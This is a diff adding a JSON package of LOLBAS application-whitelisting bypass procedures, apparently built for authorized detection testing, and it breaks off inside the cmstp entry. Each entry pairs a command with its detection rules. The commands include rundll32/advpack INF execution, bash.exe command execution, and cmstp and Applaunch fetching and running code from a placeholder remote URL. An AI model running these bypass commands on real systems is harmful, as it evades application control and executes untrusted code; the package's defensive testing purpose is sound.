@@ -1,0 +1,3464 @@
+{
+  "package_id": "lolbas-awl-bypass-v1",
+  "package_name": "LOLBAS - Awl Bypass",
+  "version": "1.0.0",
+  "summary": "50 source-derived LOLBAS Project Living-Off-The-Land procedures for AWL Bypass.",
+  "description": "Faithful, deterministic conversion of explicit LOLBAS Project procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 50 distinct source procedures grouped by AWL Bypass.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Windows binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "LOLBAS Project / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "LOLBAS - ",
+  "provider": "lolbas",
+  "source": "lolbas",
+  "source_repository": "https://github.com/LOLBAS-Project/LOLBAS",
+  "source_commit": "67781fd49a5c8605bba0171dc3d3feec148b432e",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/LOLBAS-Project/LOLBAS",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Awl Bypass",
+  "mitre_tcodes": [
+    "T1059",
+    "T1105",
+    "T1127",
+    "T1127.001",
+    "T1127.002",
+    "T1202",
+    "T1218",
+    "T1218.003",
+    "T1218.004",
+    "T1218.009",
+    "T1218.010",
+    "T1218.011",
+    "T1220"
+  ],
+  "platform": [
+    "windows"
+  ],
+  "risk_badges": [
+    "observe",
+    "interact"
+  ],
+  "readiness_counts": {
+    "ready": 6,
+    "ready_with_parameters": 44
+  },
+  "category": "lotl/lolbas",
+  "tag_categories": [
+    {
+      "category_id": "lotl_lolbas_parameters",
+      "label": "LOLBAS Project Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_lolbas_argument",
+          "label": "Argument",
+          "description": "Operator-supplied argument for this authorized LOTL procedure. Source token: name or ID.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "argument"
+        },
+        {
+          "key": "lotl_lolbas_command",
+          "label": "Command",
+          "description": "Operator-supplied command for this authorized LOTL procedure. Source token: CMD:args.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "command"
+        },
+        {
+          "key": "lotl_lolbas_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: PATH_ABSOLUTE:.xoml.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_lolbas_local_path_703b495",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: PATH:.log.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_lolbas_payload_path",
+          "label": "Payload Path",
+          "description": "Operator-supplied payload path for this authorized LOTL procedure. Source token: PATH:.dll.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "payload_path"
+        },
+        {
+          "key": "lotl_lolbas_payload_path_2690070",
+          "label": "Payload Path",
+          "description": "Operator-supplied payload path for this authorized LOTL procedure. Source token: PATH:.xsl.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "payload_path"
+        },
+        {
+          "key": "lotl_lolbas_remote_host",
+          "label": "Remote Host",
+          "description": "Operator-supplied remote host for this authorized LOTL procedure. Source token: PATH_SMB:folder.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        },
+        {
+          "key": "lotl_lolbas_remote_url",
+          "label": "Remote URL",
+          "description": "Operator-supplied remote url for this authorized LOTL procedure. Source token: REMOTEURL.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "lolbas:yml/OtherMSBinaries/AccCheckConsole.yml:0:1",
+      "name": "LOLBAS - T1218 - AccCheckConsole.exe - AWL Bypass - Local execution of managed code to bypass AppLocker. [7d576f9]",
+      "description": "Verifies UI accessibility requirements. Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name. Use case: Local execution of managed code to bypass AppLocker.. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "AccCheckConsole.exe -window \"Untitled - Notepad\" #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/AccCheckConsole.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/AccCheckConsole.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "AccCheckConsole.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Local execution of managed code to bypass AppLocker.",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x86\\AccChecker\\AccCheckConsole.exe",
+          "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x64\\AccChecker\\AccCheckConsole.exe",
+          "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\arm\\AccChecker\\AccCheckConsole.exe",
+          "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\arm64\\AccChecker\\AccCheckConsole.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340",
+          "https://twitter.com/bohops/status/1477717351017680899"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_susp_acccheckconsole.yml"
+          },
+          {
+            "IOC": "Sysmon Event ID 1 - Process Creation"
+          },
+          {
+            "Analysis": "https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "DLL (.NET)"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/AccCheckConsole.yml:0:1",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSLibraries/Advpack.yml:0:1",
+      "name": "LOLBAS - T1218.011 - Advpack.dll - AWL Bypass - Run local or remote script(let) code through INF file specification. [91e9c8b]",
+      "description": "Utility for installing software and drivers with rundll32.exe. Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied). Use case: Run local or remote script(let) code through INF file specification.. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.011",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32.exe advpack.dll,LaunchINFSection #{lotl_lolbas_payload_path},,1,",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSLibraries/Advpack.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml",
+        "source_directory": "OSLibraries",
+        "source_name": "Advpack.dll",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Run local or remote script(let) code through INF file specification.",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1218.011",
+        "full_paths": [
+          "c:\\windows\\system32\\advpack.dll",
+          "c:\\windows\\syswow64\\advpack.dll"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/",
+          "https://twitter.com/ItsReallyNick/status/967859147977850880",
+          "https://twitter.com/bohops/status/974497123101179904",
+          "https://twitter.com/moriarty_meng/status/977848311603380224"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "INF"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSLibraries/Advpack.yml:0:1",
+        "source_tcodes": [
+          "T1218.011"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSLibraries/Advpack.yml:0:0",
+      "name": "LOLBAS - T1218.011 - Advpack.dll - AWL Bypass - Run local or remote script(let) code through INF file specification. [4f558c2]",
+      "description": "Utility for installing software and drivers with rundll32.exe. Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Use case: Run local or remote script(let) code through INF file specification.. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.011",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32.exe advpack.dll,LaunchINFSection #{lotl_lolbas_payload_path},DefaultInstall_SingleUser,1,",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSLibraries/Advpack.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml",
+        "source_directory": "OSLibraries",
+        "source_name": "Advpack.dll",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Run local or remote script(let) code through INF file specification.",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1218.011",
+        "full_paths": [
+          "c:\\windows\\system32\\advpack.dll",
+          "c:\\windows\\syswow64\\advpack.dll"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/",
+          "https://twitter.com/ItsReallyNick/status/967859147977850880",
+          "https://twitter.com/bohops/status/974497123101179904",
+          "https://twitter.com/moriarty_meng/status/977848311603380224"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "INF"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSLibraries/Advpack.yml:0:0",
+        "source_tcodes": [
+          "T1218.011"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Applaunch.yml:0:0",
+      "name": "LOLBAS - T1127.002 - Applaunch.exe - AWL Bypass - Execute ClickOnce applications in environments where `dfsvc.exe` would normally enforce... [d56c19f]",
+      "description": "Microsoft .NET ClickOnce Launch Utility.. Launches a ClickOnce application via `Applaunch.exe`. Bypasses SmartScreen and default AppLocker rules when the application is published as partial trust. Use case: Execute ClickOnce applications in environments where `dfsvc.exe` would normally enforce full-trust and SmartScreen checks. Can be abused as an AWL bypass in rare configurations.. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127.002",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Applaunch.exe\" /activate \"#{lotl_lolbas_remote_url}#APPLICATION_METADATA_HERE\"",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Applaunch.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Applaunch.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Applaunch.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute ClickOnce applications in environments where `dfsvc.exe` would normally enforce full-trust and SmartScreen checks. Can be abused as an AWL bypass in rare configurations.",
+        "privileges": "User",
+        "operating_system": "Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1127.002",
+        "full_paths": [
+          "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Applaunch.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Applaunch.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Applaunch.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Applaunch.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://nathan2.com/posts/clicktools",
+          "https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment",
+          "https://web.archive.org/web/20060913192623/http://blogs.msdn.com/shawnfa/archive/2005/11/30/498610.aspx"
+        ],
+        "detection": [
+          {
+            "IOC": "Applaunch.exe rarely executes unless any ClickOnce partial trusted apps are used. Any use or invocation outside dfsvc.exe with `/activate` should be considered suspicious."
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "ClickOnce"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Applaunch.yml:0:0",
+        "source_tcodes": [
+          "T1127.002"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Aspnet_Compiler.yml:0:0",
+      "name": "LOLBAS - T1127 - Aspnet_Compiler.exe - AWL Bypass - Execute proxied payload with Microsoft signed binary to bypass application control solu... [c78082b]",
+      "description": "ASP.NET Compilation Tool. Execute C# code with the Build Provider and proper folder structure in place. Use case: Execute proxied payload with Microsoft signed binary to bypass application control solutions. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "interact",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Aspnet_Compiler.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Aspnet_Compiler.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Aspnet_Compiler.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute proxied payload with Microsoft signed binary to bypass application control solutions",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1127",
+        "full_paths": [
+          "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe",
+          "c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/",
+          "https://docs.microsoft.com/en-us/dotnet/api/system.web.compilation.buildprovider.generatecode?view=netframework-4.8"
+        ],
+        "detection": [
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_aspnet_compiler.yml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Aspnet_Compiler.yml:0:0",
+        "source_tcodes": [
+          "T1127"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Bash.yml:0:3",
+      "name": "LOLBAS - T1202 - Bash.exe - AWL Bypass - Performs execution of specified file, can be used to bypass Application Whitelisting. [2f72f39]",
+      "description": "File used by Windows subsystem for Linux. Executes executable from bash.exe Use case: Performs execution of specified file, can be used to bypass Application Whitelisting.. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1202",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "bash.exe -c \"#{lotl_lolbas_command}\"",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_command"
+      ],
+      "required_assets": [],
+      "operational_risk": "interact",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Bash.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Bash.exe",
+        "command_index": 3,
+        "category": "AWL Bypass",
+        "usecase": "Performs execution of specified file, can be used to bypass Application Whitelisting.",
+        "privileges": "User",
+        "operating_system": "Windows 10",
+        "source_mitre_id": "T1202",
+        "full_paths": [
+          "C:\\Windows\\System32\\bash.exe",
+          "C:\\Windows\\SysWOW64\\bash.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules",
+          "https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/"
+        ],
+        "detection": [
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml"
+          },
+          {
+            "IOC": "Child process from bash.exe"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "CMD"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Bash.yml:0:3",
+        "source_tcodes": [
+          "T1202"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Bginfo.yml:0:3",
+      "name": "LOLBAS - T1218 - Bginfo.exe - AWL Bypass - Remote execution of VBScript [e848cc4]",
+      "description": "Background Information Utility included with SysInternals Suite. Execute bginfo.exe from a WebDAV server. Use case: Remote execution of VBScript. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "\\\\#{lotl_lolbas_remote_host}\\webdav\\bginfo.exe #{lotl_lolbas_local_path} /popup /nolicprompt",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path",
+        "lotl_lolbas_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Bginfo.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Bginfo.exe",
+        "command_index": 3,
+        "category": "AWL Bypass",
+        "usecase": "Remote execution of VBScript",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "no default"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "WSH"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Bginfo.yml:0:3",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Bginfo.yml:0:5",
+      "name": "LOLBAS - T1218 - Bginfo.exe - AWL Bypass - Remote execution of VBScript [fbc5c9a]",
+      "description": "Background Information Utility included with SysInternals Suite. This style of execution may not longer work due to patch. Use case: Remote execution of VBScript. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe #{lotl_lolbas_remote_host} /popup /nolicprompt",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Bginfo.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Bginfo.exe",
+        "command_index": 5,
+        "category": "AWL Bypass",
+        "usecase": "Remote execution of VBScript",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "no default"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "WSH"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Bginfo.yml:0:5",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Bginfo.yml:0:1",
+      "name": "LOLBAS - T1218 - Bginfo.exe - AWL Bypass - Local execution of VBScript [a48cc1e]",
+      "description": "Background Information Utility included with SysInternals Suite. Execute VBscript code that is referenced within the specified .bgi file. Use case: Local execution of VBScript. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "bginfo.exe #{lotl_lolbas_local_path} /popup /nolicprompt",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Bginfo.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Bginfo.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Local execution of VBScript",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "no default"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "WSH"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Bginfo.yml:0:1",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Cmstp.yml:0:1",
+      "name": "LOLBAS - T1218.003 - Cmstp.exe - AWL Bypass - Execute code hidden within an inf file. Execute code directly from Internet. [13036b7]",
+      "description": "Installs or removes a Connection Manager service profile.. Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll. Use case: Execute code hidden within an inf file. Execute code directly from Internet.. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "cmstp.exe /ni /s #{lotl_lolbas_remote_url}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Cmstp.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Cmstp.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Execute code hidden within an inf file. Execute code directly from Internet.",
+        "privileges": "User",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
+        "source_mitre_id": "T1218.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\cmstp.exe",
+          "C:\\Windows\\SysWOW64\\cmstp.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/NickTyrer/status/958450014111633408",
+          "https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80",
+          "https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e",
+          "https://oddvar.moe/2017/08/15/research-on-cmstp-exe/",
+          "https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1",
+          "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp",
+          "https://gist.github.com/ghosts621/ea8ad5b8a0904dd40b33f01f0e8285dc"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml"
+          },
+          {
